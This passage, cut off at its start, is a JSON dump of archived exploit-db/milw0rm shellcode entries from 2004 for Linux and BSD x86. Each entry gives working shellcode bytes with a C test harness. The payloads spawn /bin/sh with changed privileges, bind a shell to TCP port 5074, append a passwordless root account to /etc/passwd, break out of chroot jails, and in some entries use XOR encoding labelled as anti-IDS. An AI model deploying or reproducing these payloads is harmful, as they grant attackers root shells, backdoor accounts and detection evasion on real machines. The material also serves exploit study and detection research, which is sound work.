     // int          $0x80", "", "*/", "", "void main() {", "__asm__ (\"", "\txorl\t%ebx, %ebx", "\tleal\t0x17(%ebx),%eax", "\tint\t$0x80\t\t\t\t# here was cleared eax", "", "\txorl\t%edx, %edx", "\tpushl\t%edx", "\tpushl\t$0x68732f6e", "\tpushl\t$0x69622f2f", "\tmovl\t%esp, %ebx", "\tpushl\t%edx", "\tpushl\t%ebx", "\tmovl\t%esp, %ecx", "\tmovb\t$0xb, %al\t\t\t# and makeuof here", "\tint\t$0x80", "\t\");", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + setreuid(12,12) Shellcode (50 bytes)", "Author": "anonymous", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13447.c", "View": "https://old.exploit-db.com/raw/13447/", "code": ["/*", " *  Linux/x86", " *  An example of setregid(), execve() /bin/sh", " *", " *  (I used this in practise, hence the setregid(12, 12);)", " */", "", "#include <stdio.h>", "", "char c0de[] = ", "/* main: */                            /* setregid(12, 12);        */", "\"\\x29\\xc0\"                             /* subl %eax, %eax          */", "\"\\xb0\\x47\"                             /* movb $71, %al            */", "\"\\x29\\xdb\"                             /* subl %ebx, %ebx          */", "", "/*", " *  Here's the GID for the setregid() call. Change to suit.", " */", "\"\\xb3\\x0c\"                             /* movb $12, %bl            */", "\"\\x89\\xd9\"                             /* movl %ebx, %ecx          */", "", "\"\\xcd\\x80\"                             /* int $0x80                */", "\"\\xeb\\x18\"                             /* jmp callz                */", "", "/* start: */ /* execve of /bin/sh */", "\"\\x5e\"                                 /* popl %esi                */", "\"\\x29\\xc0\"                             /* subl %eax, %eax          */", "\"\\x88\\x46\\x07\"                         /* movb %al, 0x07(%esi)     */", "\"\\x89\\x46\\x0c\"                         /* movl %eax, 0x0c(%esi)    */", "\"\\x89\\x76\\x08\"                         /* movl %esi, 0x08(%esi)    */", "\"\\xb0\\x0b\"                             /* movb $0x0b, %al          */", "\"\\x87\\xf3\"                             /* xchgl %esi, %ebx         */", "\"\\x8d\\x4b\\x08\"                         /* leal 0x08(%ebx), %ecx    */", "\"\\x8d\\x53\\x0c\"                         /* leal 0x0c(%ebx), %edx    */", "\"\\xcd\\x80\"                             /* int $0x80                */", "", "/* callz: */", "\"\\xe8\\xe3\\xff\\xff\\xff\"                 /* call start               */", "", "/* /bin/sh */", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(c0de));", "        (*ret) = (int)c0de;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Bind (5074/TCP) Shell Shellcode (92 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-357.php", "View": null, "code": ["/* ", " * s0t4ipv6@Shellcode.com.ar", " * x86 portbind a shell in port 5074", " * 92 bytes.", " *", " */", "", "char shellcode[] =", "\"\\x31\\xc0\"\t\t\t// xorl\t\t%eax,%eax", "\"\\x50\"\t\t\t\t// pushl\t%eax", "\"\\x40\"\t\t\t\t// incl\t\t%eax", "\"\\x89\\xc3\"\t\t\t// movl\t\t%eax,%ebx", "\"\\x50\"\t\t\t\t// pushl\t%eax", "\"\\x40\"\t\t\t\t// incl\t\t%eax", "\"\\x50\"\t\t\t\t// pushl\t%eax", "\"\\x89\\xe1\"\t\t\t// movl\t\t%esp,%ecx", "\"\\xb0\\x66\"\t\t\t// movb\t\t$0x66,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", "\"\\x31\\xd2\"\t\t\t// xorl\t\t%edx,%edx", "\"\\x52\"\t\t\t\t// pushl\t%edx", "\"\\x66\\x68\\x13\\xd2\"\t\t// pushw\t$0xd213", "\"\\x43\"\t\t\t\t// incl\t\t%ebx", "\"\\x66\\x53\"\t\t\t// pushw\t%bx", "\"\\x89\\xe1\"\t\t\t// movl\t\t%esp,%ecx", "\"\\x6a\\x10\"\t\t\t// pushl\t$0x10", "\"\\x51\"\t\t\t\t// pushl\t%ecx", "\"\\x50\"\t\t\t\t// pushl\t%eax", "\"\\x89\\xe1\"\t\t\t// movl\t\t%esp,%ecx", "\"\\xb0\\x66\"\t\t\t// movb\t\t$0x66,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", "\"\\x40\"\t\t\t\t// incl\t\t%eax", "\"\\x89\\x44\\x24\\x04\"\t\t// movl\t\t%eax,0x4(%esp,1)", "\"\\x43\"\t\t\t\t// incl\t\t%ebx", "\"\\x43\"\t\t\t\t// incl\t\t%ebx", "\"\\xb0\\x66\"\t\t\t// movb\t\t$0x66,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", "\"\\x83\\xc4\\x0c\"\t\t\t// addl\t\t$0xc,%esp", "\"\\x52\"\t\t\t\t// pushl\t%edx", "\"\\x52\"\t\t\t\t// pushl\t%edx", "\"\\x43\"\t\t\t\t// incl\t\t%ebx", "\"\\xb0\\x66\"\t\t\t// movb\t\t$0x66,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", "\"\\x93\"\t\t\t\t// xchgl\t%eax,%ebx", "\"\\x89\\xd1\"\t\t\t// movl\t\t%edx,%ecx", "\"\\xb0\\x3f\"\t\t\t// movb\t\t$0x3f,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", "\"\\x41\"\t\t\t\t// incl\t\t%ecx", "\"\\x80\\xf9\\x03\"\t\t\t// cmpb\t\t$0x3,%cl", "\"\\x75\\xf6\"\t\t\t// jnz\t\t<shellcode+0x40>", "\"\\x52\"\t\t\t\t// pushl\t%edx", "\"\\x68\\x6e\\x2f\\x73\\x68\"\t\t// pushl\t$0x68732f6e", "\"\\x68\\x2f\\x2f\\x62\\x69\"\t\t// pushl\t$0x69622f2f", "\"\\x89\\xe3\"\t\t\t// movl\t\t%esp,%ebx", "\"\\x52\"\t\t\t\t// pushl\t%edx", "\"\\x53\"\t\t\t\t// pushl\t%ebx", "\"\\x89\\xe1\"\t\t\t// movl\t\t%esp,%ecx", "\"\\xb0\\x0b\"\t\t\t// movb\t\t$0xb,%al", "\"\\xcd\\x80\"\t\t\t// int\t\t$0x80", ";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Bind (5074/TCP) Shell + fork() Shellcode (130 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13449.c", "View": "https://old.exploit-db.com/raw/13449/", "code": ["/*", " * s0t4ipv6@shellcode.com.ar", " * 0x9abril0x7d2", "", "sys_socketcall (102) (0x66) %eax, esta es nuestra rutina principal.", "En todas las subrutinas vamos a necesitar a:", "", "%eax = 0x66.", "", "Luego del archivo include/linux/net.h obtenemos la siguiente lista, echenle un vistazo.", "Entonces en %ebx vamos a necesitar el valor de la subrutina que estemos.", "", "subrutina       %ebx", "--------------------", "SYS_SOCKET      0x1", "SYS_BIND        0x2", "SYS_CONNECT     0x3", "SYS_LISTEN      0x4", "SYS_ACCEPT      0x5", "--------------------", "", "En memoria vamos asi", "Cada subrutina va a afectar a %ebp de la siguiente forma", "%ebp", "---------------------------------------------------------", "offset  0x8     0xc     0x10    0x14    0x16    0x18", "=========================================================", "socket  |0x2    |0x1    |0x0    |///////|///////|///////|", "        -------------------------------------------------", "bind    |0x5(1) |*0x14  |0x10   |0x2    |0xd213 |0x0    |", "        -------------------------------------------------", "listen  |0x5(1) |0x1    |0x10   |0x2    |0xd213 |0x0    |", "        -------------------------------------------------", "accept  |0x5(1) |0x0    |NULL   |0x2    |0xd213 |0x0    |", "        -------------------------------------------------", "", "*0x14   es la direccion de memoria de %ebp+14", "(*1)    el valor de %eax cambia despues de cada syscall", "", "(*2)\tRemitirse al archivo adjunto notas-lnx-bind.txt", "", " *", " */", "", "#include <stdio.h>", "", "char shellcode[]=", "// Shellcode                    // AsmCode                      / Comentarios                   Referencia kernel", "// sys_fork (2)", "\"\\x31\\xc0\"                      // xorl         %eax,%eax", "\"\\x89\\xc3\"                      // movl         %eax,%ebx", "\"\\xb0\\x02\"                      // movb         $0x2,%al\t/ sys_fork (2)", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x38\\xc3\"                      // cmpl         %ebx,%eax\t/ Pregunto; %eax = 0x0", "\"\\x74\\x05\"                  \t// je      \t0x5\t\t/ Si es verdadero me salto el la funcion exit", "", "// sys_exit (1)", "\"\\x8d\\x43\\x01\"\t\t\t// leal   \t0x1(%ebx),%eax  / sys_exit (1)", "\"\\xcd\\x80\"                      // int          $0x80", "", "// Subrutina socket", "// soccer=socket(2,1,0)", "\"\\x31\\xc0\"                      // xorl    %eax,%eax\t\t", "\"\\x89\\x45\\x10\"                  // movl    %eax,0x10(%ebp)\t/ IPPROTO_IP = 0x0\t\tinclude/linux/in.h", "\"\\x40\"                          // incl    %eax\t\t\t/ %eax es 0x1", "\"\\x89\\xc3\"                      // movl    %eax,%ebx\t\t/ SYS_SOCKET = 0x1\t\tinclude/linux/net.h", "\"\\x89\\x45\\x0c\"                  // movl    %eax,0xc(%ebp)\t/ SOCK_STREAM = 0x1\t\tinclude/linux/socket.h", "\"\\x40\"                          // incl    %eax\t\t\t/ %eax es 0x2", "\"\\x89\\x45\\x08\"                  // movl    %eax,0x8(%ebp)\t/ AF_INET = 0x2\t\t\tinclude/linux/socket.h", "\"\\x8d\\x4d\\x08\"                  // leal    0x8(%ebp),%ecx\t/ Direccion de nuestra construccion a %ecx", "\"\\xb0\\x66\"                      // movb    $0x66,%al\t\t/ sys_socketcall (102)", "\"\\xcd\\x80\"                      // int     $0x80", "\"\\x89\\x45\\x08\"                  // movl    %eax,0x8(%ebp)\t/ Guardo el valor de %eax en 0x8(%ebp) Ref(*1)", "", "                                                                // %eax=0x5 %ebx=0x1 %ecx=(%edi+8) %edx=0x3", "// Subrutina bind", "// bind(soccer, (struct sockaddr*)&serv, sizeof(struct sockaddr))", "\"\\x43\"                          // incl    %ebx\t\t\t/ SYS_BIND = 0x2\t\tinclude/linux/net.h", "\"\\x66\\x89\\x5d\\x14\"              // movw    %bx,0x14(%ebp)\t/ AF_INET = 0x2\t\t\tinclude/linux/socket.h\t", "\"\\x66\\xc7\\x45\\x16\\x13\\xd2\"      // movw    $0xd213,0x16(%ebp)\t/ Numero de puerto 5074ipv6 ;-))", "\"\\x31\\xd2\"                      // xorl    %edx,%edx\t\t", "\"\\x89\\x55\\x18\"                  // movl    %edx,0x18(%ebp)\t/ %edx es 0x0", "\"\\x8d\\x55\\x14\"                  // leal    0x14(%ebp),%edx\t/ Usamos %edx como registro intermedio", "\"\\x89\\x55\\x0c\"                  // movl    %edx,0xc(%ebp)\t/ ", "\"\\xc6\\x45\\x10\\x10\"              // movb    $0x10,0x10(%ebp)\t/ sizeof(struct sockaddr) = 10h = 16", "\"\\xb0\\x66\"                      // movb    $0x66,%al\t\t/\t4 bytes = AF_INET", "\"\\xcd\\x80\"                      // int     $0x80\t\t/\t4 bytes = Puerto", "\t\t\t\t\t\t\t\t//\t8 bytes = 0.0.0.0", "", "                                                                // %eax=0x0 %ebx=0x2 %ecx=(%edi+8) %edx=(%edi+14)", "// Subrutina listen", "// listen(soccer, 1)", "\"\\x40\"                          // incl    %eax", "\"\\x89\\x45\\x0c\"                  // movl    %eax,0xc(%ebp)\t/ Aceptamos 1 conexion, 2 no tendria sentido", "\"\\x43\"\t\t\t\t// incl\t   %ebx\t\t\t/ Ref(*2a)\t\t", "\"\\x43\"\t\t\t\t// incl\t   %ebx\t\t\t/ SYS_LISTEN = 0x4\t\tinclude/linux/net.h", "\"\\xb0\\x66\"                      // movb    $0x66,%al\t\t", "\"\\xcd\\x80\"                      // int     $0x80", "", "                                                                // %eax=0x0 %ebx=0x4 %ecx(%edi+8) %edx=(%edi+14)", "// Subrutina accept", "// int accept(int s, struct sockaddr *addr, socklen_t *addrlen);", "\"\\x43\"                          // incl    %ebx\t\t\t/ %ebx es 0x5", "\"\\x89\\x45\\x0c\"                  // movl    %eax,0xc(%ebp)\t/ Ponemos 0 en 0xc(%ebp)", "\"\\x89\\x45\\x10\"                  // movl    %eax,0x10(%ebp)\t/ Y un NULL en 0x10(%ebp) Ref(*2b)", "\"\\xb0\\x66\"                      // movb    $0x66,%al\t\t", "\"\\xcd\\x80\"                      // int     $0x80", "\"\\x89\\xc3\"                      // movl    %eax,%ebx\t\t/ El valor de soccer a %ebx", "", "// Ahora vamos a cambiar la syscall a sys_dup2 (63)", "// dup2(soccer, 0) el valor de soccer ya lo tenemos en ebx 3 lineas arriba", "\"\\x31\\xc9\"                      // xorl    %ecx,%ecx\t\t/ %ecx es 0x0\t", "\"\\xb0\\x3f\"                      // movb    $0x3f,%al\t\t/ sys_dup2 (63)\t\t    ", "\"\\xcd\\x80\"                      // int     $0x80\t\t/\t    ", "\"\\x41\"                          // incl    %ecx\t\t\t/ %ecx es 0x1", "\"\\x80\\xf9\\x03\"                  // cmpb    $0x3,%cl\t\t/ Pregunto; %ecx = 3", "\"\\x75\\xf6\"                      // jne     -0xa\t\t\t/ si es falso salto al movb", "", "// execve\t\t\t// Minishell de Raise", "\"\\x31\\xd2\"                      // xorl    %edx,%edx", "\"\\x52\"                          // pushl   %edx", "\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl   $0x68732f6e", "\"\\x68\\x2f\\x2f\\x62\\x69\"          // pushl   $0x69622f2f", "\"\\x89\\xe3\"                      // movl    %esp,%ebx", "\"\\x52\"                          // pushl   %edx", "\"\\x53\"                          // pushl   %ebx", "\"\\x89\\xe1\"                      // movl    %esp,%ecx", "\"\\xb0\\x0b\"                      // movb    $0xb,%al\t\t/ Raise: esta linea la modifique para reducir 1 byte", "\"\\xcd\\x80\";                     // int     $0x80", "", "", "void main () {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Add Root User (t00r) To /etc/passwd Shellcode (82 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13450.c", "View": "https://old.exploit-db.com/raw/13450/", "code": ["/*", " * s0t4ipv6@shellcode.com.ar", " * 0x14abril0x7d2", " *", " * 82 bytes ", " * Agrega la linea \"t00r::0:0::/:/bin/sh\" en /etc/passwd", " *", " * Encriptada en http://www.shellcode.com.ar/linux/lnx-t00r-cr1.c", " * ", "*/", "", "#include <stdio.h>", "", "// Shellcode\t\t\t// Asm Code", "char shellcode[]=", "\"\\x31\\xc0\"                      // xorl         %eax,%eax", "\"\\x50\"                          // pushl        %eax", "\"\\x68\\x73\\x73\\x77\\x64\"          // pushl        $0x64777373", "\"\\x68\\x63\\x2f\\x70\\x61\"          // pushl        $0x61702f63", "\"\\x68\\x2f\\x2f\\x65\\x74\"          // pushl        $0x74652f2f", "\"\\x89\\xe3\"                      // movl         %esp,%ebx", "\"\\x8d\\x48\\x02\"                  // leal         0x2(%eax),%ecx", "\"\\x8d\\x40\\x05\"                  // leal         0x5(%eax),%eax", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x89\\xc3\"                      // movl         %eax,%ebx", "\"\\x87\\xca\"                      // xchgl        %ecx,%edx", "\"\\x31\\xc9\"                      // xorl         %ecx,%ecx", "\"\\xb0\\x13\"                      // movb         $0x13,%al", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x51\"                          // pushl        %ecx", "\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl        $0x68732f6e", "\"\\x68\\x3a\\x2f\\x62\\x69\"          // pushl        $0x69622f3a", "\"\\x68\\x30\\x3a\\x3a\\x2f\"          // pushl        $0x2f3a3a30", "\"\\x68\\x3a\\x3a\\x30\\x3a\"          // pushl        $0x3a303a3a", "\"\\x68\\x74\\x30\\x30\\x72\"          // pushl        $0x72303074", "\"\\x8d\\x41\\x04\"                  // leal         0x4(%ecx),%eax", "\"\\x89\\xe1\"                      // movl         %esp,%ecx", "\"\\xb2\\x14\"                      // movb         $0x14,%dl", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x31\\xc0\"                      // xorl         %eax,%eax", "\"\\xb0\\x06\"                      // movb         $0x6,%al", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x40\"                          // incl         %eax", "\"\\xcd\\x80\";                     // int          $0x80", "", "main() {", "\tint *ret;", "\tret=(int *)&ret+2;", "\tprintf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "\t(*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Add Root User Shellcode (104 bytes)", "Author": "Matt Conover", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13451.c", "View": "https://old.exploit-db.com/raw/13451/", "code": ["/* ", " * Source to this is pass.s", " * This will append a root line to the passwd file (see the source).", " *", " * Shok (Matt Conover), shok@dataforce.net", " */", "", "char shellcode[]=", "  \"\\xeb\\x03\\x5f\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x31\\xdb\\xb3\\x35\\x01\\xfb\"", "  \"\\x30\\xc0\\x88\\x43\\x0b\\x31\\xc9\\x66\\xb9\\x41\\x04\\x31\\xd2\\x66\\xba\\xa4\"", "  \"\\x01\\x31\\xc0\\xb0\\x05\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x41\\x01\\xf9\\x31\"", "  \"\\xd2\\xb2\\x1f\\x31\\xc0\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\\x2f\"", "  \"\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x01\\x77\\x30\\x30\\x77\\x30\"", "  \"\\x30\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x77\\x30\\x77\\x30\\x77\\x21\\x3a\\x2f\\x3a\"", "  \"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\";", "", "void main()", "{", "", "  int *ret;", "  ", "  printf(\"w00w00!\\n\");", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Break chroot (../ 10x Loop) Shellcode (28 bytes)", "Author": "dev0id", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/lnx_chroot_sc.c", "View": null, "code": ["/* The chroot() shellcode. It is the one of the smallest shellcodes", "   in the !!world!!", "   it will put '../' 10 times", "   Size  28 bytes", "   OS\t Linux", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "main:", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\tecx", "\tmov\tcl,30", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,30", "main_inc:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_inc", "\tmov\tebx,esp", "\tmov\tal,61", "\tint\t0x80", "", "", "*/", "", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x51\\xb1\\x1e\\x6a\\x2e\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\"", "\t\"\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x89\\xe3\\xb0\\x3d\\xcd\\x80\";", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "BSD/x86 - setuid(0) + Break chroot (../ 10x Loop) Shellcode (46 bytes)", "Author": "dev0id", "Published": ": 2004-09-12", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/stuid_chroot_sc.c", "View": null, "code": ["/* The setuid(0)+chroot() shellcode", "   it will put '../' 10 times", "   Size  46 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(www.sysworld.net)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "", "jmp short callme", "main:", "\tpop\tesi", "\tmov\tedi,esi", "\txor\tecx,ecx", "\tpush\tecx", "\tmov\tal,0x17", "\tpush\teax", "\tint\t0x80", "\txor\teax,eax", "\tpush\teax", "\tmov\tcl,0x1e", "\tmov\tal,0x2e", "\trepne   stosb", "\tpop\teax", "\tstosb", "\tmov\tcl,0x1e", "main_loop:", "\tdec\tcl", "\tinc byte [esi+ecx]", "\tdec\tcl", "\tloop\tmain_loop", "\tpush \tesi", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "callme:", "\tcall\tmain", "", "*/", "char shellcode[] =", "\t\"\\xeb\\x27\\x5e\\x89\\xf7\\x31\\xc9\\x51\\xb0\\x17\\x50\\xcd\\x80\\x31\\xc0\"", "\t\"\\x50\\xb1\\x1e\\xb0\\x2e\\xf2\\xaa\\x58\\xaa\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\"", "\t\"\\x0e\\xfe\\xc9\\xe2\\xf7\\x56\\xb0\\x3d\\x50\\xcd\\x80\\xe8\\xd4\\xff\\xff\"", "\t\"\\xff\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - Break chroot + execve(/bin/sh) Shellcode (80 bytes)", "Author": "preedator", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-363.php", "View": null, "code": ["/* This is Linux chroot()/execve() code.It is 80 bytes long.I have some    *", " * ideas how to make it smaller, but till then use this one.               *", " *                                         signed predator                 *", " *                                         linux registered user : 181116  *", " *                                         preedator(at)sendmail(dot)ru    *", " ***************************************************************************/", "", "char sc[]=\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x17\\xcd\\x80\\xeb\\x36\\x5e\\x88\\x46\\x0a\"", "          \"\\x8d\\x5e\\x05\\xb1\\xed\\xb0\\x27\\xcd\\x80\\x31\\xc0\\xb0\\x3d\\xcd\\x80\\x83\"", "          \"\\xc3\\x02\\xb0\\x0c\\xcd\\x80\\xe0\\xfa\\xb0\\x3d\\xcd\\x80\\x89\\x76\\x08\\x31\"", "          \"\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\x89\\xf3\\x8d\\x4e\\x08\\x89\\xc2\\xb0\\x0b\"", "          \"\\xcd\\x80\\xe8\\xc5\\xff\\xff\\xff/bin/sh..\";", "", "int main(){", "  int *ret=(int *)(&ret+2);", "  printf(\"len : %d\\n\",strlen(sc));", "  *ret=(int)sc;", "}", "", "", "// Asm code", "/*********************************************", " *int main(){                                *", " * __asm__(\" xorl %eax,%eax           \\n\"    *", " *\t   \" xorl %ebx,%ebx           \\n\"    *", " *         \" xorl %ecx,%ecx           \\n\"    *", " *\t   \" movb $0x17,%al           \\n\"    *", " *\t   \" int  $0x80               \\n\"    *", " *         \" jmp 0x36                 \\n\"    *", " *         \" popl %esi                \\n\"    *", " *\t   \" movb %al,0xa(%esi)       \\n\"    *", " *         \" leal 0x5(%esi),%ebx      \\n\"    *", " *\t   \" movb $0xed,%cl           \\n\"    *", " *\t   \" movb $0x27,%al           \\n\"    *", " *\t   \" int $0x80                \\n\"    *", " *         \" xorl %eax,%eax           \\n\"    *", " *         \" movb $0x3d,%al           \\n\"    *", " *\t   \" int $0x80                \\n\"    * ", " *\t   \" addl $0x2,%ebx           \\n\"    *", " *         \" movb $0xc,%al            \\n\"    *", " *\t   \" int $0x80                \\n\"    *", " *         \" loopne -0x06             \\n\"    *", " *         \" movb $0x3d,%al           \\n\"    *", " *\t   \" int $0x80                \\n\"    *", " *\t   \" movl %esi,0x8(%esi)      \\n\"    * ", " *         \" xorl %eax,%eax           \\n\"    * ", " *         \" movb %al,0x7(%esi)       \\n\"    *", " *         \" movl %eax,0xc(%esi)      \\n\"    *", " *         \" movl %esi,%ebx           \\n\"    *", " *         \" leal 0x8(%esi),%ecx      \\n\"    *", " *         \" movl %eax,%edx           \\n\"    *", " *         \" movb $0xb,%al            \\n\"    *", " *         \" int $0x80                \\n\"    *", " *         \" call -0x3b               \\n\"    *", " *         \" .string \\\"/bin/sh..\\\"    \\n\");  *", " *}                                          *", " *********************************************/ ", "", "//C code", "/**********************************************", "*int main(){                                  *", "*  char *sh[2]={\"/bin/sh\",NULL};              *", "*  int gg=0xed                                *", "*  mkdir(\"sh..\",gg);\t\t\t      *", "*  chroot(\"sh..\");\t\t\t      *", "*  while (gg!=0){                             *", "*     chdir(\"..\");gg--;                       *", "*  }                                          *", "* chroot(\"..\");                               *", "* execve(sh[0],sh,NULL);                      *", "*}                                            *", "***********************************************/", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Anti-IDS Shellcode (58 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-358.php", "View": null, "code": ["/* !!!!!! PRIVATE !!!!!!!", "", "   // ANTI-IDS SHELLCODE //", "   // !!!!!!!!!!!!!!!!!! //", "", "   s0t4ipv6@shellcode.com.ar", "   0x1d abril 0x7d2", "   ./test.c", "", "   !!! Shellcode (execve sh) Encriptada ", "   !!! AHORA EN 58 BYTES !!!!!!!!!!!!!!", "", "   Notese que la encripcion se ha hecho a toda la shellcode y no solamente al string /bin/sh.", "", "   Perteneciente al paquete JempiScodes.tgz, por Matias Sedalo <s0t4ipv6@shellcode.com.ar>.", "   http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz !!", "", "   En caso de requerirla para otra plataforma, dentro de la linea BSD. Mailme.", "", "*/", "#include <stdio.h>", "", "char shellcode[]= ", "", "\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x18\\x59\\x49\\x5b\\x8a\\x04\\x0f\" // 0x14 de mayo", "\"\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\"", "\"\\xe0\\xff\\xff\\xff\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\"", "\"\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\";\t\t// ***********", "", "/*", "\"\\xeb\\x29\\x31\\xc0\\x31\\xdb\\x8b\\x24\\x24\\x29\\xd2\\x4a\\x31\\xc9\\xb1\"", "\"\\x18\\xb3\\x53\\x8a\\x04\\x0c\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x17\\x86\\xc3\"", "\"\\x49\\x4a\\x85\\xc9\\x75\\xee\\x42\\x89\\xec\\x01\\xd7\\x57\\xc3\\xe8\\xd2\"", "\"\\xff\\xff\\xff\\x53\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\"", "\"\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\";", "*/", "", "void main() {", "\tint *ret;", "\tret = (int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "\t(*ret) =(int)shellcode;", "}", "", "// ANTI-IDS SHELLCODE //", "// !!!!!!!!!!!!!!!!!! //", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + XOR Encoded Shellcode (55 bytes)", "Author": "anonymous", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13456.c", "View": "https://old.exploit-db.com/raw/13456/", "code": ["/*", ".file \"xor-encrypted shellcode\"", ".version \"1.0\"", ".text", "\t.align 4", ".globl main", "\t.type main,@function", "_start:", "\txorl\t%eax,%eax", "\tjmp    \t0x22", "\tpopl   \t%ebx\t", "\tmovl\t8(%ebx),%edx", "\txor\t%edx,(%ebx)", "\txor\t%edx,4(%ebx)", "\txor\t%edx,%edx", "\tmovl   \t%ebx,0x8(%esp)", "\tmovl   \t%edx,0xc(%esp)", "\tmovb   \t$0xb,%al", "\tleal   \t0x8(%esp),%ecx", "\tint    \t$0x80", "\txorl   \t%ebx,%ebx", "\tmovl   \t%ebx,%eax", "\tincl   \t%eax", "\tint   \t$0x80", "\tcall\t-0x27", "\t.string \"\\x6e\\x23\\x28\\x2f\\x6e\\x32\\x29\\x41\\x41\\x41\\x41\\x41\"", "*/", "", "#define NAME \"encrypted\"", "", "char code[]=", "\"\\x31\\xc0\\xeb\\x22\\x5b\\x8b\\x53\\x08\\x31\\x13\\x31\\x53\\x04\\x31\\xd2\\x89\"", "\"\\x5c\\x24\\x08\\x89\\x54\\x24\\x0c\\xb0\\x0b\\x8d\\x4c\\x24\\x08\\xcd\\x80\\x31\"", "\"\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xd9\\xff\\xff\\xff\"", "\"\\x6e\\x23\\x28\\x2f\\x6e\\x32\\x29\\x41\" /* encrypted \"/bin/sh\" */", "\"\\x41\\x41\\x41\\x41\";     /* Conversion chars */", "", "main()", "{", "  int (*funct)();", "  funct = (int (*)()) code;", "  printf(\"%s shellcode\\n\\tSize = %d\\n\",NAME,strlen(code));", "  (int)(*funct)();", "}", "", "// milw0rm.com [2004-09-12]"]},
